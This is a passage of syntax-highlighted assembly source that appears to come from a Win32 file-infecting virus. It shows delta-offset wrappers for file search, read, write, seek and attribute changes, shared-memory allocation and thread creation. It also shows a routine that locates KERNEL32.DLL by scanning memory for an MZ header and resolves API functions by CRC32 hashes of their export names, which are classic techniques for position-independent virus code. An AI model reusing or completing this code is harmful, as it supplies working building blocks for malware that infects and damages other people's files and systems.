        </span><span class="sc7">fldcw</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exp_default</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">frstor</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_nl_buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;restore all regz &amp; flagz</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decimal_places</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">sqrt2</span><span class="sc0">       </span><span class="sc9">dt</span><span class="sc0">  </span><span class="sc2">3FFFB504F333F9DE6485r</span><span class="sc0">   </span><span class="sc1">;copro sqrt(2) format</span><span class="sc0">
</span><span class="sc5">source_value</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0000000000h</span><span class="sc0">
</span><span class="sc5">divided_value</span><span class="sc0">   </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0000000000h</span><span class="sc0">
</span><span class="sc5">rounded_value</span><span class="sc0">   </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">1000000000</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ common file operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">__MyOpenFile</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;opens EDX file</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">               </span><span class="sc1">;save all registers</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;file name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCreateFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;handle - take away</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;success ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">;jump if STC, if not CLC :)</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MyReadFile</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; read some bytes (ECX) from certain filepos (ESI)</span><span class="sc0">
            </span><span class="sc1">; to buffer (EDX) by handle (EBX)</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     ECX ... number of bytes to read</span><span class="sc0">
            </span><span class="sc1">;     EDX ... destination buffer</span><span class="sc0">
            </span><span class="sc1">;     ESI ... file pos</span><span class="sc0">
            </span><span class="sc1">;     EBX ... file handle</span><span class="sc0">
            </span><span class="sc1">;   output:</span><span class="sc0">
            </span><span class="sc1">;     ECX ... number of reader bytes, CFlags</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MySeekFile</span><span class="sc0">        </span><span class="sc1">;change file pos</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;save for later using...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;support 2^64-2 bigger file ?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_error</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;real readed bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddReadFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_ecx</span><span class="sc0">    </span><span class="sc1">;save old ECX to PUSHAD</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_error</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">;jump if STC, if not CLC :)</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_error</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MyWriteFile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; write some bytes (ECX) to certain filepos (ESI)</span><span class="sc0">
            </span><span class="sc1">; from buffer (EDX) by handle (EBX)</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     ECX ... number of bytes to write</span><span class="sc0">
            </span><span class="sc1">;     EDX ... source buffer</span><span class="sc0">
            </span><span class="sc1">;     ESI ... file pos</span><span class="sc0">
            </span><span class="sc1">;     EBX ... file handle</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MySeekFile</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;save for later using...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;file bigger then 2^64-2 ?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_error</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;number of bytes to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;source buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddWriteFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_ecx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_error</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">;jump if STC, if not CLC :)</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_error</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MySeekFile</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; seek in the file</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     ESI ... new file pos</span><span class="sc0">
            </span><span class="sc1">;     EBX ... file handle</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;FILE_BEGIN defined in "WinBase.H"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;support 2^64-2 file size ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;new file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetFilePointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MySetAttrFile</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; change file attributes</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     ECX ... new file attributes</span><span class="sc0">
            </span><span class="sc1">;     EDX ... file name pointer</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;new attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;file name pointer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MyCloseFile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; close (EBX) file handle</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;handle to close</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCloseHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MyGetFileSize</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; get file size</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     EBX ... file handle</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;file bigger then 2^64-2 ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetFileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MyFindFirst</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; search certain file</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     EDX ... file mask</span><span class="sc0">
            </span><span class="sc1">;     ESI ... dta</span><span class="sc0">
            </span><span class="sc1">;   output:</span><span class="sc0">
            </span><span class="sc1">;     EAX ... handle, CF status</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;output dta</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;file mask</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddFindFirstFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;were we successful ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MyFindNext</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; find next file</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     EAX ... handle</span><span class="sc0">
            </span><span class="sc1">;     ESI ... dta</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;output dta</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;FindFirstFile handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddFindNextFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;success ?</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MyFindClose</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; close file searcher</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     EAX ... handle</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;FindFirstFile handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddFindClose</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;success ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">malloc</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">; allocate memory (EAX)</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;name of mapping object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;low 32 bits of object size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;high 32 bits of object size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;optional security attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;no file, only shared memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__malloc_failed</span><span class="sc0">     </span><span class="sc1">;success ?</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;number of bytes to map</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;low 32 bits of file offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;high 32 bits of file offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">      </span><span class="sc1">;access mode</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;mapped object</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddMapViewOfFile</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__malloc_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;memory address or NULL</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mdealloc</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; deallocate memory (EAX)</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;mapped address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__MyCreateThread</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; create thread</span><span class="sc0">
            </span><span class="sc1">;   input:</span><span class="sc0">
            </span><span class="sc1">;     EAX ... thread function</span><span class="sc0">
            </span><span class="sc1">;     EBX ... parameter</span><span class="sc0">
            </span><span class="sc1">;   output:</span><span class="sc0">
            </span><span class="sc1">;     EAX ... thread handle</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">         </span><span class="sc1">;thread identifier</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;create flags</span><span class="sc0">
    </span><span class="sc5">__mct_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;parameter</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;start address</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;stack size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;security attributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCreateThread</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;EAX through POPA :)</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to get kernel's address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function searchs functions in:</span><span class="sc0">
        </span><span class="sc1">;    * KERNEL32.DLL, USER32.DLL, ADVAPI32.DLL</span><span class="sc0">
        </span><span class="sc1">;At first I'll open library, get export table, RVA ... and</span><span class="sc0">
        </span><span class="sc1">;then I'll compare CRC32 with function names.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__fk32_inside</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;library tables</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">find_kernel32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;I need kernel's address</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">65536</span><span class="sc0">
    </span><span class="sc5">__scanning</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">65536</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__scanning</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
